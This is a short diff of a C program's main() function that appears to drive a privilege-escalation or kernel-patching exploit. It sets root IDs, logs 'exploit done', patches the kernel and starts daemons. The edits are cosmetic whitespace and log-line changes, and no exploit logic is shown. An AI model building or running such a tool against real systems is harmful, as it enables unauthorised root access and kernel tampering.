@@ -101,6 +101,7 @@ int start_daemons(void) {
     return 0;
 }
 
+
 int main(void) {
     setuid(0);
     setgid(0);
@@ -111,16 +112,15 @@ int main(void) {
         exit(0);
         return -1;
     }
+
     print_log("[*] exploit done\n");  
-      
     if (patch_kernel() != 0) {
         print_log("[-] failed to patch kernel\n");
         return -1;
     }
+    
     print_log("[*] kernel patched\n");
-
     start_daemons();
-    print_log("[*] daemons loaded\n");
 
     print_log("[*] done\n");
     return 0;
